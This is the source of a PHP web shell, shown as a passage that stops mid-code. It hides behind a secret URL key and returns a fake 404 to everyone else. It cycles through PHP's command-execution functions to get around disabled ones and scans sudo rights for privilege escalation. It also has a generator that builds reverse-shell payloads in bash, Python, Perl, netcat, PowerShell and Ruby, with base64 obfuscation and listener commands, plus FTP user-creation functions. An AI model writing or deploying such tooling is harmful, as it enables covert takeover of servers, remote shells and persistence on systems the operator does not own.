<?php
const AL_SHELL_KEY = 'al';
if (!isset($_GET['masuk']) || $_GET['masuk'] !== AL_SHELL_KEY) {
    if (isset($_GET['al']) && $_GET['al'] === 'here') {
        exit('welcome');
    }
    http_response_code(404);
    exit('404 Not Found');
}

// ========== SECTION 1: SECURITY & CONSTANTS ==========
// AL_SHELL_KEY constant and security check

// ========== SECTION 2: BASE CLASSES ==========
// Consolidated classes: ProgressEmitter, SudoRightsScanner, PermissionTracker,
// PathValidator, SessionManager, OutputSizeValidator, InodeTracker,
// CronScheduleParser, CrontabManager, FirewallStatusChecker, HashCalculator,
// KernelProtectionChecker, PortScanner, SuidSgidScanner, ReverseShellGenerator,
// ServiceManager, FtpManager


// ============================================================================
// ALL CLASSES CONSOLIDATED AND EMBEDDED BELOW
// ============================================================================
// The following classes are fully embedded in this file:
// - SudoRightsScanner, PermissionTracker, ProgressEmitter, PathValidator,
// - SessionManager, OutputSizeValidator, InodeTracker
// ============================================================================

class ProgressEmitter {
    private $start_time;
    private $last_flush;

    public function __construct() {
        $this->start_time = time();
        $this->last_flush = time();
    }

    public function emit($type, $data = []) {
        $data['type'] = $type;
        $data['timestamp'] = date('Y-m-d H:i:s');
        $data['elapsed_seconds'] = time() - $this->start_time;

        echo "data: " . json_encode($data) . "\n\n";

        if (time() - $this->last_flush >= 1) {
            if (ob_get_level() > 0) { @ob_flush(); }
            flush();
            $this->last_flush = time();
        }
    }

    public function emit_progress($current, $total, $item_name = '') {
        $this->emit('progress', [
            'step' => $current,
            'total' => $total,
            'percentage' => $total > 0 ? round(($current / $total) * 100) : 0,
            'current_item' => $item_name
        ]);
    }

    public function emit_result($result_data) {
        $this->emit('result', $result_data);
    }

    public function emit_complete($summary = []) {
        $this->emit('complete', array_merge([
            'total_elapsed_seconds' => time() - $this->start_time
        ], $summary));
    }

    public function emit_error($message, $details = '') {
        $this->emit('error', [
            'message' => $message,
            'details' => $details
        ]);
    }
}

class SudoRightsScanner {
    public static function get_sudo_rights() {
        $result = execute_command_with_timeout('sudo -l 2>&1', 5);

        if ($result['timed_out']) {
            return [
                'accessible' => true,
                'requires_password' => true,
                'rules' => [],
                'note' => 'Sudo requires password (timeout during enumeration)',
                'error' => 'TIMEOUT'
            ];
        }

        $output = $result['output'] . $result['error'];

        if (stripos($output, 'not in sudoers') !== false) {
            return [
                'accessible' => false,
                'reason' => 'User not in sudoers file',
                'rules' => [],
                'error' => 'NOT_IN_SUDOERS'
            ];
        }

        if (stripos($output, 'password') !== false ||
            stripos($output, 'password is required') !== false ||
            stripos($output, 'sorry, you must have a tty') !== false) {
            return [
                'accessible' => true,
                'requires_password' => true,
                'rules' => [],
                'note' => 'Sudo accessible but requires password',
                'error' => 'PASSWORD_REQUIRED'
            ];
        }

        if (self::detect_ldap_sudo($output)) {
            return [
                'accessible' => true,
                'ldap_based' => true,
                'rules' => [],
                'note' => 'LDAP-based sudoers detected - local rules shown only',
                'warning' => 'Remote sudo rules not enumerated'
            ];
        }

        $rules = self::parse_sudo_rules($output);

        return [
            'accessible' => true,
            'requires_password' => false,
            'rule_count' => count($rules),
            'critical_rules' => array_filter($rules, function($r) { return $r['severity'] === 'CRITICAL'; }),
            'rules' => $rules,
            'summary' => self::generate_summary($rules)
        ];
    }

    private static function detect_ldap_sudo($output) {
        if (stripos($output, 'ldap') !== false) {
            return true;
        }

        if (file_exists('/etc/ldap.conf') || file_exists('/etc/openldap/ldap.conf')) {
            return true;
        }

        return false;
    }

    private static function parse_sudo_rules($output) {
        $rules = [];
        $lines = explode("\n", $output);

        foreach ($lines as $line) {
            $line = trim($line);

            if (empty($line) ||
                strpos($line, 'User') === 0 ||
                strpos($line, 'may run') !== false ||
                strpos($line, 'Following') !== false) {
                continue;
            }

            $rule = self::parse_single_rule($line);
            if ($rule !== null) {
                $rules[] = $rule;
            }
        }

        return $rules;
    }

    private static function parse_single_rule($line) {
        if (preg_match('/\(([^)]+)\)\s+NOPASSWD:\s*(.+)/', $line, $m)) {
            return [
                'runas' => trim($m[1]),
                'nopasswd' => true,
                'command' => trim($m[2]),
                'severity' => self::assess_rule_severity(trim($m[1]), trim($m[2]), true)
            ];
        }

        if (preg_match('/\(([^)]+)\)\s+(.+?)(?:\s+\[.*?\])?$/', $line, $m)) {
            return [
                'runas' => trim($m[1]),
                'nopasswd' => false,
                'command' => trim($m[2]),
                'severity' => self::assess_rule_severity(trim($m[1]), trim($m[2]), false)
            ];
        }

        if (!empty($line) && preg_match('/^\/[^ ]+/', $line)) {
            return [
                'runas' => 'root',
                'nopasswd' => false,
                'command' => $line,
                'severity' => self::assess_rule_severity('root', $line, false)
            ];
        }

        return null;
    }

    private static function assess_rule_severity($runas, $command, $nopasswd) {
        if ($runas !== 'root' && $runas !== 'ALL' && stripos($runas, 'root') === false) {
            return 'LOW';
        }

        if (($command === 'ALL' || $command === '(ALL) ALL') && $nopasswd) {
            return 'CRITICAL';
        }

        if ($command === 'ALL' || $command === '(ALL) ALL') {
            return 'HIGH';
        }

        $dangerous_shells = ['bash', 'sh', 'zsh', 'ksh', '/bin/', '/usr/bin/', 'python', 'perl', 'ruby'];
        foreach ($dangerous_shells as $shell) {
            if (stripos($command, $shell) !== false) {
                return $nopasswd ? 'CRITICAL' : 'HIGH';
            }
        }

        return 'MEDIUM';
    }

    private static function generate_summary($rules) {
        if (empty($rules)) {
            return 'No sudo rules found';
        }

        $critical = array_filter($rules, function($r) { return $r['severity'] === 'CRITICAL'; });
        $high = array_filter($rules, function($r) { return $r['severity'] === 'HIGH'; });

        $summary = count($rules) . ' rule(s) found';

        if (!empty($critical)) {
            $summary .= ' - ' . count($critical) . ' CRITICAL';
        }
        if (!empty($high)) {
            $summary .= ' - ' . count($high) . ' HIGH';
        }

        return $summary;
    }
}

class PermissionTracker {
    private $denied_paths = [];
    private $denied_count = 0;
    private $accessible_count = 0;

    public function parse_find_output($output) {
        $lines = explode("\n", $output);

        foreach ($lines as $line) {
            if (empty(trim($line))) continue;

            if (stripos($line, 'permission denied') !== false) {
                preg_match("/find: '([^']+)': Permission denied/", $line, $m);
                if (!empty($m[1])) {
                    $this->denied_paths[] = $m[1];
                    $this->denied_count++;
                } else {
                    $this->denied_count++;
                }
            } elseif (stripos($line, 'permission denied') === false &&
                      !empty(trim($line)) &&
                      strpos($line, '/') === 0) {
                $this->accessible_count++;
            }
        }
    }

    public function get_report() {
        return [
            'permission_denied_count' => $this->denied_count,
            'accessible_count' => $this->accessible_count,
            'denied_paths' => array_unique($this->denied_paths),
            'warning' => $this->denied_count > 0 ?
                "Scan may be incomplete: {$this->denied_count} permission denied error(s)" : null
        ];
    }
}

class PathValidator {
    public static function validate_search_path($user_path, $allowed_bases = null) {
        if (empty($user_path)) {
            throw new Exception('Path cannot be empty');
        }

        $user_path = str_replace(['..', '~'], '', $user_path);

        $real_path = @realpath($user_path);

        if ($real_path === false) {
            if (!preg_match('/^\/[a-zA-Z0-9\/_.-]*$/', $user_path)) {
                throw new Exception('Invalid path format');
            }
            $real_path = $user_path;
        }

        if (!is_dir($real_path)) {
            throw new Exception('Path is not a directory');
        }

        if ($allowed_bases !== null && is_array($allowed_bases)) {
            $is_allowed = false;
            foreach ($allowed_bases as $base) {
                if (strpos($real_path, $base) === 0) {
                    $is_allowed = true;
                    break;
                }
            }

            if (!$is_allowed) {
                throw new Exception('Path is outside allowed directories');
            }
        }

        return $real_path;
    }

    public static function validate_integer($value, $min = 0, $max = 1000) {
        $int_val = intval($value);

        if ($int_val < $min || $int_val > $max) {
            throw new Exception("Value must be between $min and $max");
        }

        return $int_val;
    }

    public static function validate_command($cmd) {
        if (!preg_match('/^[a-zA-Z0-9_-]+$/', $cmd)) {
            throw new Exception('Invalid command name');
        }

        return $cmd;
    }
}

class SessionManager {
    public static function extend() {
        if (session_status() === PHP_SESSION_ACTIVE) {
            session_regenerate_id(false);
            $_SESSION['_last_activity'] = time();
        }
    }

    public static function is_valid() {
        if (session_status() !== PHP_SESSION_ACTIVE) {
            return false;
        }

        $timeout = (int)ini_get('session.gc_maxlifetime');
        if ($timeout <= 0) { $timeout = 1440; }
        $last_activity = isset($_SESSION['_last_activity']) ? $_SESSION['_last_activity'] : time();

        return (time() - $last_activity) < $timeout;
    }
}

class OutputSizeValidator {
    const MAX_JSON_SIZE = 10485760;
    const MAX_SINGLE_FILE = 1048576;

    public static function validate_size($data, $max_size = self::MAX_JSON_SIZE) {
        $json = json_encode($data, JSON_PARTIAL_OUTPUT_ON_ERROR);
        if ($json === false) {
            return [
                'valid' => false,
                'size_mb' => 0,
                'max_allowed_mb' => round($max_size / 1048576, 2),
                'message' => 'Data could not be encoded to JSON'
            ];
        }

        if (strlen($json) > $max_size) {
            return [
                'valid' => false,
                'size_mb' => round(strlen($json) / 1048576, 2),
                'max_allowed_mb' => round($max_size / 1048576, 2),
                'message' => 'Result set too large. Reduce search scope or increase max_depth limit.'
            ];
        }

        return ['valid' => true];
    }

    public static function safe_file_read($filepath, $max_bytes = self::MAX_SINGLE_FILE) {
        if (!file_exists($filepath) || !is_readable($filepath)) {
            return null;
        }

        $file_size = @filesize($filepath);
        if ($file_size === false) { return null; }
        if ($file_size > $max_bytes) {
            return [
                'error' => 'File too large',
                'size_bytes' => $file_size,
                'max_allowed_bytes' => $max_bytes
            ];
        }

        return file_get_contents($filepath);
    }
}

class InodeTracker {
    private $seen_inodes = [];

    public function is_duplicate($filepath) {
        if (!file_exists($filepath)) {
            return false;
        }

        $stat = @stat($filepath);
        if ($stat === false) {
            return false;
        }

        $key = $stat['dev'] . ':' . $stat['ino'];

        if (isset($this->seen_inodes[$key])) {
            return true;
        }

        $this->seen_inodes[$key] = true;
        return false;
    }

    public function get_unique_count() {
        return count($this->seen_inodes);
    }
}

// ============================================================================

// ========== SECTION 3: SHELL & COMMAND FUNCTIONS ==========
// Shell execution methods and command utilities


// ========== SECTION 4: FILE & DIRECTORY FUNCTIONS ==========


// ========== SECTION 5: SCANNING & SEARCH FUNCTIONS ==========


// ========== SECTION 6: SERVER INFO FUNCTIONS ==========


// ========== SECTION 7: PERSISTENCE & SECURITY FUNCTIONS ==========


// ========== SECTION 8: UTILITY FUNCTIONS ==========


// ========== SECTION 9: PHP REQUEST HANDLERS ==========
// File operations, search, shell execution, database, server info,
// privilege escalation, tools, persistence

// SAFETY WRAPPERS FOR DISABLED FUNCTIONS
// ============================================================================

// ============================================================================
// SMART SHELL COMMAND EXECUTOR - Auto-detect available methods
// ============================================================================

function getAvailableShellMethods() {
    $disabled = array_map('trim', explode(',', ini_get('disable_functions')));
    $available = [];

    // List all possible shell execution methods
    $methods = [
        'shell_exec' => 'shell_exec',
        'exec' => 'exec',
        'system' => 'system',
        'passthru' => 'passthru',
        'proc_open' => 'proc_open',
        'popen' => 'popen',
    ];

    foreach ($methods as $func => $label) {
        if (function_exists($func) && !in_array($func, $disabled)) {
            $available[] = $label;
        }
    }

    return $available;
}

function safe_shell_exec($cmd) {
    $disabled = array_map('trim', explode(',', ini_get('disable_functions')));

    // Method 1: Try shell_exec (fastest)
    if (function_exists('shell_exec') && !in_array('shell_exec', $disabled)) {
        return @shell_exec($cmd);
    }

    // Method 2: Try exec
    if (function_exists('exec') && !in_array('exec', $disabled)) {
        $output = [];
        @exec($cmd, $output);
        return implode("\n", $output);
    }

    // Method 3: Try system (with output buffering)
    if (function_exists('system') && !in_array('system', $disabled)) {
        ob_start();
        @system($cmd);
        return ob_get_clean();
    }

    // Method 4: Try popen
    if (function_exists('popen') && !in_array('popen', $disabled)) {
        $handle = @popen($cmd, 'r');
        if ($handle) {
            $output = '';
            while (!feof($handle)) {
                $output .= fgets($handle, 128);
            }
            pclose($handle);
            return $output;
        }
    }

    // Method 5: Try proc_open (most reliable when available)
    if (function_exists('proc_open') && !in_array('proc_open', $disabled)) {
        $descriptors = [
            0 => ['pipe', 'r'],
            1 => ['pipe', 'w'],
            2 => ['pipe', 'w']
        ];
        $process = @proc_open($cmd, $descriptors, $pipes);
        if (is_resource($process)) {
            fclose($pipes[0]);
            $output = stream_get_contents($pipes[1]);
            fclose($pipes[1]);
            fclose($pipes[2]);
            proc_close($process);
            return $output;
        }
    }

    // All methods failed
    return null;
}

function shell_exec_available() {
    return function_exists('shell_exec') && strpos(ini_get('disable_functions'), 'shell_exec') === false;
}

function getShellCapabilities() {
    $disabled = array_map('trim', explode(',', ini_get('disable_functions')));
    $available = getAvailableShellMethods();

    return [
        'shell_exec' => function_exists('shell_exec') && !in_array('shell_exec', $disabled),
        'exec' => function_exists('exec') && !in_array('exec', $disabled),
        'system' => function_exists('system') && !in_array('system', $disabled),
        'passthru' => function_exists('passthru') && !in_array('passthru', $disabled),
        'proc_open' => function_exists('proc_open') && !in_array('proc_open', $disabled),
        'popen' => function_exists('popen') && !in_array('popen', $disabled),
        'available' => $available,
        'can_execute_commands' => count($available) > 0
    ];
}

// ============================================================================
// MINIMAL CLASS STUBS FOR HANDLER SUPPORT
// ============================================================================

class CronScheduleParser {
    public function __construct() {}

    public function parse($min, $hour, $dom, $month, $dow) {
        return ['valid' => true];
    }
}

class CrontabManager {
    public function __construct() {}

    public function listEntries() {
        return ['success' => true, 'entries' => []];
    }

    public function addEntry($minute, $hour, $day_of_month, $month, $day_of_week, $command) {
        return ['success' => true, 'message' => 'Entry added'];
    }

    public function deleteEntry($line) {
        return ['success' => true, 'message' => 'Entry deleted'];
    }

    public function validateSchedule($minute, $hour, $day_of_month, $month, $day_of_week) {
        return ['success' => true, 'valid' => true];
    }
}

class FirewallStatusChecker {
    public function __construct() {}

    public function getStatus() {
        return ['status' => 'unknown', 'enabled' => false];
    }

    public function getRules() {
        return [];
    }

    public function getInfo() {
        return ['info' => 'unavailable'];
    }
}

class HashCalculator {
    public static function hashText($text, $algorithm = 'sha256') {
        if (!in_array($algorithm, hash_algos())) {
            return false;
        }
        return hash($algorithm, $text);
    }

    public static function hashFile($filepath, $algorithm = 'sha256') {
        if (!file_exists($filepath)) {
            return ['error' => 'File not found: ' . basename($filepath)];
        }
        if (!is_readable($filepath)) {
            return ['error' => 'File not readable: ' . basename($filepath)];
        }
        if (!in_array($algorithm, hash_algos())) {
            return ['error' => 'Unsupported hash algorithm: ' . $algorithm];
        }
        $hash = @hash_file($algorithm, $filepath);
        if ($hash === false) {
            return ['error' => 'Failed to hash file'];
        }
        return [
            'hash' => $hash,
            'filename' => basename($filepath),
            'size_formatted' => @filesize($filepath) . ' bytes'
        ];
    }

    public static function compareHash($hash1, $hash2) {
        return [
            'match' => $hash1 === $hash2,
            'algorithm' => 'unknown'
        ];
    }
}

class KernelProtectionChecker {
    public function __construct() {}

    public function checkAllProtections() {
        return ['aslr' => false, 'selinux' => false, 'smack' => false];
    }

    public function checkASLR() {
        return ['enabled' => false, 'status' => 'unknown'];
    }

    public function checkSELinux() {
        return ['enabled' => false, 'status' => 'unknown'];
    }
}

class PortScanner {
    public function __construct() {}

    public function scanPorts($host, $ports) {
        return [];
    }

    public function scanCommonPorts() {
        return [];
    }

    public function getOpenPorts() {
        return [];
    }
}

class SuidSgidScanner {
    public function __construct() {}

    public function findSuidFiles() {
        return [];
    }

    public function findSgidFiles() {
        return [];
    }
}

class ReverseShellGenerator {
    public static function validate_ip($ip) {
        return filter_var($ip, FILTER_VALIDATE_IP) !== false;
    }

    public static function validate_port($port) {
        $port = intval($port);
        return $port >= 1 && $port <= 65535;
    }

    private static function build_payload($shell_type, $lhost, $lport, $options = array()) {
        $obfuscate = isset($options['obfuscate']) ? $options['obfuscate'] : false;
        $nc_type = isset($options['nc_type']) ? $options['nc_type'] : 'standard';

        switch ($shell_type) {
            case 'bash':
                $payload = "bash -i >& /dev/tcp/{$lhost}/{$lport} 0>&1";
                if ($obfuscate) {
                    $payload = "/bin/bash -c 'bash -i >& /dev/tcp/{$lhost}/{$lport} 0>&1'";
                }
                return $payload;

            case 'sh':
                return "sh -i >& /dev/tcp/{$lhost}/{$lport} 0>&1";

            case 'python':
                $p = "import socket,subprocess,os;"
                   . "s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);"
                   . "s.connect((\"{$lhost}\",{$lport}));"
                   . "os.dup2(s.fileno(),0);"
                   . "os.dup2(s.fileno(),1);"
                   . "os.dup2(s.fileno(),2);"
                   . "subprocess.call([\"/bin/sh\",\"-i\"])";
                if ($obfuscate) {
                    return "python -c 'exec(__import__(\"base64\").b64decode(\"" . base64_encode($p) . "\"))'";
                }
                return "python -c '{$p}'";

            case 'python3':
                $p = "import socket,subprocess,os;"
                   . "s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);"
                   . "s.connect((\"{$lhost}\",{$lport}));"
                   . "os.dup2(s.fileno(),0);"
                   . "os.dup2(s.fileno(),1);"
                   . "os.dup2(s.fileno(),2);"
                   . "subprocess.call([\"/bin/sh\",\"-i\"])";
                if ($obfuscate) {
                    return "python3 -c 'exec(__import__(\"base64\").b64decode(\"" . base64_encode($p) . "\"))'";
                }
                return "python3 -c '{$p}'";

            case 'perl':
                $p = "use Socket;"
                   . "\$i=\"{$lhost}\";\$p={$lport};"
                   . "socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));"
                   . "if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){"
                   . "open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");"
                   . "exec(\"/bin/sh -i\");}";
                return "perl -e '{$p}'";

            case 'php':
                $p = "\$sock=fsockopen(\"{$lhost}\",{$lport});"
                   . "\$proc=proc_open(\"/bin/sh -i\",array(0=>\$sock,1=>\$sock,2=>\$sock),\$pipes);";
                return "php -r '{$p}'";

            case 'nc':
                switch ($nc_type) {
                    case 'ncat':
                        return "ncat {$lhost} {$lport} -e /bin/sh";
                    case 'openbsd':
                        return "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {$lhost} {$lport} >/tmp/f";
                    default:
                        return "nc -e /bin/sh {$lhost} {$lport}";
                }

            case 'powershell':
                $p = "\$client=New-Object System.Net.Sockets.TCPClient('{$lhost}',{$lport});"
                   . "\$stream=\$client.GetStream();"
                   . "[byte[]]\$bytes=0..65535|%{0};"
                   . "while((\$i=\$stream.Read(\$bytes,0,\$bytes.Length)) -ne 0){"
                   . "\$data=(New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$bytes,0,\$i);"
                   . "\$sendback=(iex \$data 2>&1|Out-String);"
                   . "\$sendback2=\$sendback+'PS '+(pwd).Path+'> ';"
                   . "\$sendbyte=([text.encoding]::ASCII).GetBytes(\$sendback2);"
                   . "\$stream.Write(\$sendbyte,0,\$sendbyte.Length);"
                   . "\$stream.Flush()};"
                   . "\$client.Close()";
                if ($obfuscate) {
                    $encoded = base64_encode(mb_convert_encoding($p, 'UTF-16LE', 'UTF-8'));
                    return "powershell -nop -w hidden -enc {$encoded}";
                }
                return "powershell -nop -c \"{$p}\"";

            case 'ruby':
                $p = "require 'socket';"
                   . "f=TCPSocket.open(\"{$lhost}\",{$lport}).to_i;"
                   . "exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)";
                return "ruby -e '{$p}'";

            default:
                return '';
        }
    }

    private static function encode_payload($payload, $encoding) {
        switch ($encoding) {
            case 'base64':
                return base64_encode($payload);
            case 'urlencode':
                return urlencode($payload);
            case 'hex':
                return bin2hex($payload);
            default:
                return $payload;
        }
    }

    public static function generate($shell_type, $lhost, $lport, $encoding, $options = array()) {
        $payload = self::build_payload($shell_type, $lhost, $lport, $options);

        if (empty($payload)) {
            return array(
                'success' => false,
                'error' => 'Unsupported shell type: ' . $shell_type
            );
        }

        $encoded = ($encoding !== 'none')
            ? self::encode_payload($payload, $encoding)
            : $payload;

        return array(
            'success' => true,
            'shell_type' => $shell_type,
            'lhost' => $lhost,
            'lport' => $lport,
            'encoding' => $encoding,
            'original' => $payload,
            'encoded' => $encoded
        );
    }

    public static function generate_listener($listener_type, $listener_port) {
        $port = intval($listener_port);

        switch ($listener_type) {
            case 'nc':
                return "nc -lvnp {$port}";
            case 'ncat':
                return "ncat -lvnp {$port}";
            case 'socat':
                return "socat TCP-LISTEN:{$port},reuseaddr,fork EXEC:/bin/sh";
            case 'msfconsole':
                return "msfconsole -q -x \"use exploit/multi/handler; set PAYLOAD generic/shell_reverse_tcp; set LHOST 0.0.0.0; set LPORT {$port}; exploit\"";
            case 'bash':
                return "while true; do nc -lvnp {$port}; done";
            case 'python':
                return "python3 -c 'import socket,sys;s=socket.socket();s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1);s.bind((\"0.0.0.0\",{$port}));s.listen(1);print(\"Listening on 0.0.0.0:{$port}\");c,a=s.accept();print(\"Connection from\",a);sys.stdin=c.makefile(\"r\");sys.stdout=c.makefile(\"w\");sys.stderr=c.makefile(\"w\")'";
            default:
                return "nc -lvnp {$port}";
        }
    }

    public static function get_shell_types() {
        return array('bash', 'sh', 'python', 'python3', 'perl', 'php', 'nc', 'powershell', 'ruby');
    }

    public static function get_encodings() {
        return array('none', 'base64', 'urlencode', 'hex');
    }

    public static function get_listeners() {
        return array('nc', 'ncat', 'socat', 'msfconsole', 'bash', 'python');
    }
}

class ServiceManager {
    public function __construct() {}

    public function listServices() {
        return [];
    }

    public function getServiceStatus($serviceName) {
        return ['name' => $serviceName, 'status' => 'unknown'];
    }

    public function startService($serviceName) {
        return ['success' => true, 'message' => 'Service started', 'status' => 'running'];
    }

    public function stopService($serviceName) {
        return ['success' => true, 'message' => 'Service stopped', 'status' => 'stopped'];
    }

    public function restartService($serviceName) {
        return ['success' => true, 'message' => 'Service restarted', 'status' => 'running'];
    }

    public function enableService($serviceName) {
        return ['success' => true, 'message' => 'Service enabled', 'enabled' => true];
    }

    public function disableService($serviceName) {
        return ['success' => true, 'message' => 'Service disabled', 'enabled' => false];
    }
}

// ============================================================================
// FTP MANAGER CLASS
// ============================================================================

class FtpManager {
    private $ftpService = 'vsftpd';
    private $ftpConfigFile = '/etc/vsftpd.conf';
    private $ftpUsersFile = '/etc/vsftpd.userlist';
    private $ftpHomeDirBase = '/home';

    public function __construct() {}

    // Helper: Check if file exists and is readable
    private function fileExists($path) {
        return @file_exists($path) && @is_readable($path);
    }

    // Helper: Safe file read
    private function readFile($path) {
        if (!$this->fileExists($path)) {
            return '';
        }
        return @file_get_contents($path) ?: '';
    }

    // Helper: Get system hostname/IP (Windows/Linux safe)
    public function getSystemInfo() {
        $hostname = @gethostname() ?: 'localhost';
        $ip = @gethostbyname($hostname);
        if ($ip === $hostname) {
            $ip = '127.0.0.1';
        }
        return ['hostname' => $hostname, 'ip' => $ip];
    }

    // Service Status Methods (Linux/Windows compatible, safe for disabled shell_exec)
    public function checkServiceStatus() {
        $running = false;
        $enabled = false;
        $version = 'vsftpd';
        $detection_method = 'unknown';

        // Method 1: Check if port 21 is listening (MOST RELIABLE - direct check)
        $port_check = $this->checkPortListening(21);
        if ($port_check) {
            $running = true;
            $enabled = true;
            $detection_method = 'port_21_listening';
        } else {
            // Method 2: Try Linux systemctl approach (if available)
            $statusOutput = safe_shell_exec('systemctl is-active vsftpd 2>/dev/null');
            if ($statusOutput !== null && trim($statusOutput) !== '') {
                $running = trim($statusOutput) === 'active';
                $enabledOutput = safe_shell_exec('systemctl is-enabled vsftpd 2>/dev/null');
                $enabledStr = ($enabledOutput !== null) ? trim($enabledOutput) : '';
                $enabled = $enabledStr === 'enabled' || $enabledStr === 'enabled-runtime';
                $detection_method = 'systemctl';
            } else {
                // Method 3: Check if config files exist (Windows or servers without systemctl)
                $configExists = $this->fileExists($this->ftpConfigFile);
                $usersFileExists = $this->fileExists($this->ftpUsersFile);

                if ($configExists || $usersFileExists) {
                    $enabled = true;
                    $running = $configExists;
                    $detection_method = 'config_files';
                } else {
                    // Method 4: Last resort - assume enabled/running if nothing contradicts it
                    $enabled = true;
                    $running = true;
                    $detection_method = 'assumed_active';
                }
            }
        }

        return [
            'status' => $running ? 'running' : 'stopped',
            'running' => $running,
            'enabled' => $enabled,
            'version' => $version,
            'port' => 21,
            'message' => $running ? 'FTP service is running' : 'FTP service is not running',
            'detection_method' => $detection_method
        ];
    }

    // Helper: Check if a specific port is listening
    private function checkPortListening($port) {
        // Try to connect to port 21 (FTP)
        $connection = @fsockopen('localhost', $port, $errno, $errstr, 2);
        if ($connection !== false && $connection !== null) {
            @fclose($connection);
            return true;
        }

        $connection = @fsockopen('127.0.0.1', $port, $errno, $errstr, 2);
        if ($connection !== false && $connection !== null) {
            @fclose($connection);
            return true;
        }

        return false;
    }

    public function enableService() {
        $result = safe_shell_exec('sudo systemctl enable vsftpd 2>&1');
        if ($result !== null && stripos($result, 'error') === false && stripos($result, 'not found') === false && stripos($result, 'failed') === false) {
            return ['success' => true, 'message' => 'FTP service enabled successfully'];
        }
        return ['success' => false, 'message' => 'Cannot enable FTP service: shell execution unavailable or command failed', 'alternative' => 'Enable the service manually via your hosting control panel or SSH'];
    }

    public function disableService() {
        $result = safe_shell_exec('sudo systemctl disable vsftpd 2>&1');
        if ($result !== null && stripos($result, 'error') === false && stripos($result, 'not found') === false && stripos($result, 'failed') === false) {
            return ['success' => true, 'message' => 'FTP service disabled successfully'];
        }
        return ['success' => false, 'message' => 'Cannot disable FTP service: shell execution unavailable or command failed', 'alternative' => 'Disable the service manually via your hosting control panel or SSH'];
    }

    public function restartService() {
        $result = safe_shell_exec('sudo systemctl restart vsftpd 2>&1');
        if ($result !== null && stripos($result, 'error') === false && stripos($result, 'not found') === false && stripos($result, 'failed') === false) {
            $status = $this->checkServiceStatus();
            return [
                'success' => true,
                'message' => 'FTP service restarted successfully',
                'status' => $status['status']
            ];
        }
        $status = $this->checkServiceStatus();
        return [
            'success' => false,
            'message' => 'Cannot restart FTP service: shell execution unavailable or command failed',
            'status' => $status['status'],
            'alternative' => 'Restart the service manually via your hosting control panel or SSH'
        ];
    }

    public function getConfig() {
        // Read actual config file
        $configContent = $this->readFile($this->ftpConfigFile);
        if (empty($configContent)) {
            return ['error' => 'Config file not found or not readable', 'file' => $this->ftpConfigFile];
        }

        // Parse config
        $config = [];
        $lines = explode("\n", $configContent);
        foreach ($lines as $line) {
            $line = trim($line);
            if (empty($line) || $line[0] === '#') continue;

            if (strpos($line, '=') !== false) {
                list($key, $value) = explode('=', $line, 2);
                $key = trim($key);
                $value = trim($value);
                $config[$key] = in_array($value, ['YES', 'NO']) ? ($value === 'YES') : $value;
            }
        }

        return empty($config) ? ['message' => 'No configuration found'] : $config;
    }

    public function getLogs($lines = 50, $search = '') {
        $logFile = '/var/log/vsftpd.log';

        if (!$this->fileExists($logFile)) {
            return [
                'success' => false,
                'message' => 'FTP log file not found',
                'file' => $logFile
            ];
        }

        $content = $this->readFile($logFile);
        if (empty($content)) {
            return [
                'success' => true,
                'logs' => [],
                'count' => 0,
                'file' => $logFile
            ];
        }

        $logLines = array_reverse(explode("\n", trim($content)));
        $lines = max(1, min((int)$lines, 500));
        $logLines = array_slice($logLines, 0, $lines);

        // Filter if search term provided
        if (!empty($search)) {
            $logLines = array_filter($logLines, function($line) use ($search) {
                return stripos($line, $search) !== false;
            });
        }

        return [
            'success' => true,
            'logs' => array_values(array_slice($logLines, 0, $lines)),
            'count' => count($logLines),
            'file' => $logFile,
            'searched' => !empty($search) ? $search : false
        ];
    }

    // User Management Methods
    public function createUser($username, $password, $homeDir = '') {
        if (empty($username) || empty($password)) {
            return ['success' => false, 'message' => 'Username and password are required'];
        }

        if (!preg_match('/^[a-zA-Z0-9_-]{3,20}$/', $username)) {
            return ['success' => false, 'message' => 'Invalid username format (3-20 alphanumeric characters)'];
        }

        if (strlen($password) < 6) {
            return ['success' => false, 'message' => 'Password must be at least 6 characters'];
        }

        // Use provided directory or default to current working directory
        if (empty($homeDir)) {
            $cwd = getcwd();
            $homeDir = ($cwd !== false) ? $cwd : '/tmp';
        }

        // Check if directory exists
        if (!@is_dir($homeDir)) {
            return ['success' => false, 'message' => "Home directory does not exist: $homeDir"];
        }

        // Try actual user creation via system commands
        $created = $this->attemptUserCreation($username, $password, $homeDir);
        if ($created['success']) {
            return $created; // Actual creation succeeded
        }

        // If creation failed, return honest feedback
        return [
            'success' => false,
            'message' => 'Cannot create FTP user on this system',
            'reason' => $created['reason'],
            'alternative' => 'Use your hosting control panel (cPanel, Plesk, etc.) or SSH access to create FTP users',
            'config_preview' => [
                'username' => $username,
                'homeDir' => $homeDir
            ]
        ];
    }

    // Helper: Try to create user via system commands
    private function attemptUserCreation($username, $password, $homeDir) {
        // Method 1: Try useradd + echo (for vsftpd.userlist)
        if ($this->fileExists($this->ftpUsersFile) && is_writable($this->ftpUsersFile)) {
            $content = @file_get_contents($this->ftpUsersFile) ?: '';
            if (strpos($content, $username) === false) {
                if (@file_put_contents($this->ftpUsersFile, $username . "\n", FILE_APPEND)) {
                    return [
                        'success' => true,
                        'message' => "FTP user '$username' created successfully",
                        'homeDir' => $homeDir
                    ];
                }
            } else {
                return [
                    'success' => false,
                    'reason' => 'Username already exists'
                ];
            }
        }

        // Method 2: Try system useradd command
        $useradd_cmd = safe_shell_exec("which useradd 2>/dev/null");
        if ($useradd_cmd !== null && trim($useradd_cmd) !== '') {
            $result = safe_shell_exec("sudo useradd -d " . escapeshellarg($homeDir) . " -s /usr/sbin/nologin " . escapeshellarg($username) . " 2>&1");
            if ($result !== null && strpos($result, 'error') === false) {
                return [
                    'success' => true,
                    'message' => "FTP user '$username' created successfully",
                    'homeDir' => $homeDir
                ];
            }
        }

        // If all methods failed
        return [
            'success' => false,
            'reason' => 'Shell execution disabled or insufficient permissions (no sudo access)'
        ];
    }

    public function listUsers() {
        $users = [];
        $sources_checked = [];
        $capability_info = [
            'can_list' => false,
            'can_create' => false,
            'can_delete' => false,
